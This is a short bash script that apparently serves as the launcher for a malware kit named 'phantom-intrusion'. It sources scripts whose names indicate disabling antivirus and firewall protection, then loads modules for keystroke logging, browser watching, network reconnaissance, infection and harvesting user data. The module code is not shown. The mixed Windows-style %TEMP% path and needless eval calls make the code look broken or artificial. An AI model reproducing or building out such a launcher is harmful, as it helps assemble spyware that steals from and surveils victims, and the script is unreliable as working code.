#!/bin/bash

path="%TEMP%/tsk_sp/phantom-intrusion"
source avDisruptor.sh
source fwNeutralizer.sh
eval "source $path/browser-watch/initiator.sh"
eval "source $path/infect-await/initiator.sh"
eval "source $path/keystroke-listener/initiator.sh"
eval "source $path/network-info/initiator.sh"
eval "source $path/user-harvest/initiator.sh"